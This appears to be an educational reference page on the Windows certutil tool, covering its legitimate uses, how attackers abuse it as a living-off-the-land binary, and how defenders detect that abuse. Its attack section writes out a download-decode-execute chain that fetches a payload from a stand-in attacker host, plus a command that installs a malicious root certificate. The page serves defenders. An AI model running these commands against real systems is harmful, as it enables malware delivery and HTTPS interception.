
# CertUtil

## Overview

**CertUtil** is a built-in Windows command-line utility used to manage digital certificates, perform encoding and decoding operations, generate file hashes, and retrieve files from remote sources. It is part of the Windows Public Key Infrastructure (PKI) and interacts directly with the Windows Cryptographic API (CryptoAPI).

Executable name:

```
certutil.exe
```

Default location:

```
C:\Windows\System32\certutil.exe
```

CertUtil is considered a **trusted Windows binary**, which makes it useful for system administrators but also attractive for attackers as a Living Off The Land Binary (LOLBIN).

---

# How CertUtil Works Internally

CertUtil acts as an interface between the user and Windows cryptographic and certificate management components.

It interacts with:

* Windows CryptoAPI
* Certificate Store
* File System
* Encoding and decoding mechanisms
* Network retrieval services

Basic workflow:

1. User executes certutil with arguments
2. CertUtil parses the flags and options
3. Calls CryptoAPI or Windows services
4. Executes the requested operation
5. Returns output to the console or file

Example:

```
certutil -hashfile file.exe SHA256
```

Process flow:

```
CertUtil → CryptoAPI → Hash Calculation → Output
```

---

# Primary Legitimate Uses

## 1. Display Certificate Information

```
certutil -dump certificate.cer
```

Displays:

* Issuer
* Subject
* Serial number
* Expiration date
* Public key
* Signature algorithm

---

## 2. Generate File Hash

```
certutil -hashfile file.exe SHA256
```

Supported algorithms:

* MD5
* SHA1
* SHA256
* SHA512

Security use case:

* File integrity verification
* Malware analysis validation

---

## 3. Encode File to Base64

```
certutil -encode input.exe output.txt
```

Converts:

```
Binary → Base64 text
```

Used for:

* Safe file transfer
* Certificate formatting
* Obfuscation

---

## 4. Decode Base64 to Binary

```
certutil -decode input.txt output.exe
```

Converts:

```
Base64 text → Binary executable
```

Used in:

* Certificate restoration
* Malware analysis
* Payload reconstruction

---

## 5. Download Files from Internet

```
certutil -urlcache -f http://example.com/file.exe file.exe
```

This retrieves files using Windows networking components.

---

## 6. Add Certificate to Certificate Store

```
certutil -addstore root certificate.cer
```

Adds certificate to:

```
Trusted Root Certification Authorities
```

Used for:

* Trust management
* Enterprise certificate deployment

---

# Important CertUtil Flags and Their Functions

| Flag      | Function                        | Security Impact                 |
| --------- | ------------------------------- | ------------------------------- |
| -encode   | Converts binary to Base64       | Used for obfuscation            |
| -decode   | Converts Base64 to binary       | Used to reconstruct payloads    |
| -hashfile | Generates file hash             | Used for integrity verification |
| -urlcache | Downloads remote files          | Used in malware delivery        |
| -dump     | Displays certificate contents   | Used in forensic analysis       |
| -addstore | Adds certificate to trust store | Used in MITM attacks            |
| -verify   | Verifies certificate validity   | Used in certificate validation  |

---

# Security Use Cases (Legitimate)

CertUtil is commonly used by security professionals for:

## File Integrity Verification

```
certutil -hashfile suspicious.exe SHA256
```

Helps confirm whether a file has been modified.

---

## Malware Analysis

Decode malicious payload:

```
certutil -decode payload.txt payload.exe
```

---

## Digital Forensics

Analyze certificate metadata:

```
certutil -dump certificate.cer
```

---

## Incident Response

Extract encoded payloads recovered during investigations.

---

# How Attackers Abuse CertUtil

CertUtil is classified as a **LOLBIN (Living Off The Land Binary)**.

LOLBINs are legitimate system tools abused for malicious purposes.

---

## Common Attack Scenario

### Step 1: Attacker hosts encoded payload

Example:

```
http://attacker.com/payload.txt
```

Payload is Base64 encoded.

---

### Step 2: Malware downloads payload using CertUtil

```
certutil -urlcache -f http://attacker.com/payload.txt payload.txt
```

---

### Step 3: Decode payload

```
certutil -decode payload.txt payload.exe
```

---

### Step 4: Execute payload

```
payload.exe
```

---

# Why Attackers Use CertUtil

Reasons include:

* Trusted Microsoft binary
* Often allowed by antivirus
* Bypasses application whitelisting
* No need to drop additional tools
* Native to all Windows systems

---

# MITM Attack via Certificate Injection

Attackers can install malicious root certificates:

```
certutil -addstore root evil.cer
```

Impact:

* System trusts malicious certificate
* Enables HTTPS interception
* Enables credential theft

---

# Detection and Threat Hunting

Security analysts monitor CertUtil usage through logs.

---

## Windows Event Logs

Event ID:

```
4688 — Process Creation
```

Suspicious example:

```
Process: certutil.exe
Command line: certutil -decode payload.txt payload.exe
```

---

## Sysmon Detection

Sysmon Event ID:

```
Event ID 1 — Process Creation
```

Monitor:

* Parent process
* Command-line arguments
* Execution path

---

## Suspicious Command-Line Indicators

```
certutil -urlcache
certutil -decode
certutil -encode
certutil -addstore
```

---

## Suspicious Parent Processes

```
powershell.exe
cmd.exe
winword.exe
excel.exe
wscript.exe
```

These may indicate malware execution chain.

---

## Suspicious File Locations

```
C:\Users\Username\AppData\Local\Temp\
C:\Users\Username\AppData\Roaming\
```

---

# Indicators of Compromise (IOCs)

## Process Indicators

```
certutil.exe spawning unexpectedly
certutil.exe launched by Office applications
```

---

## Network Indicators

```
certutil.exe making outbound connections
```

---

## File Indicators

```
Base64 encoded files
Unexpected .txt files containing executable content
```

---

# CertUtil in MITRE ATT&CK

Mapped techniques include:

```
T1105 – Ingress Tool Transfer
T1027 – Obfuscated Files or Information
T1553 – Subvert Trust Controls
```

---

# Security Importance of CertUtil

CertUtil plays a critical role in:

* Certificate management
* File integrity verification
* Malware analysis
* Threat hunting
* Incident response
* Red Team operations
* Blue Team detection

However, due to its trusted nature, it is also frequently abused by attackers for:

* Payload delivery
* Defense evasion
* Persistence mechanisms

---

# Summary

CertUtil is a powerful native Windows utility used for certificate management, encoding and decoding files, generating hashes, and retrieving files from remote systems.

Because it is trusted and built into Windows, attackers abuse CertUtil to download, decode, and execute malicious payloads while bypassing traditional security controls.

Security analysts must monitor CertUtil usage, especially suspicious command-line arguments, unexpected parent processes, and unusual network activity, to detect potential compromise.
